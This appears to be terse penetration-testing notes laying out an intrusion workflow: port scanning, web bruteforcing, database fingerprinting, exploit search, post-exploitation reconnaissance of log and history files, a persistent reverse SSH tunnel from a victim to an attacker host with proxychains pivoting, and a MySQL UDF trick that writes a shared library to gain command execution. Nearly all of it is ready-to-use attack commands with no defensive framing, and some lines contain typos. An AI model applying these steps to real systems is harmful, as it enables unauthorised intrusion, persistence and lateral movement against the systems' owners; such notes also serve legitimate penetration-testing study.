1. enumeration
  1.1. port scanning
    sudo nmap -sC -sS -p0-65535 <target host>
  1.2. services
    1.2.1. web
      directory bruteforcing
        dirb, wpscan, etc
    1.2.2. DB
      SELECT @@hostname, @@tmpdir, @@version, @@ version_compile_machine, @@plugin_dir;


2. search public exploits
  searchsploit

3. exploit
  follow

4. post-exploitation
  - privilege escalation
    > search public exxploits
    > catch mistakes
      ex. /var/log/auth.log, ~/.bash_history
    > find vulnerablilities
      kernel build version and time : /proc/version
      env params : env
      process : ps aux
      network : netstat -tulpn
      file system : /etc/fstab
  - creating a stable reserse tunnel
    > make a ssh key on victim
    > copy the public key into attacker's authorized_keys file
      from="<victim ip>",command="",no-agent-forwarding,no-X11-forwarding,no-pty <public key>
    > tunneling
      ssh -f -N -R <port> -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -j /var/lib/mysql/.ssh/id_rsa <user>@<attacker ip>
    > establish socks proxy
      echo "socks4 127.0.0.1 <port>" >> /etc/proxychains.conf
    > enumeration -> exploitation -> tunneling -> repeat


*retarget db
  select binary @shell into dumpfile '/home/dev/plugin/udf_sys_exec.so'
  create function sys_exec returns int soname 'udf_sys_exec.so';
  select * from mysql.func where name='sys_exec';
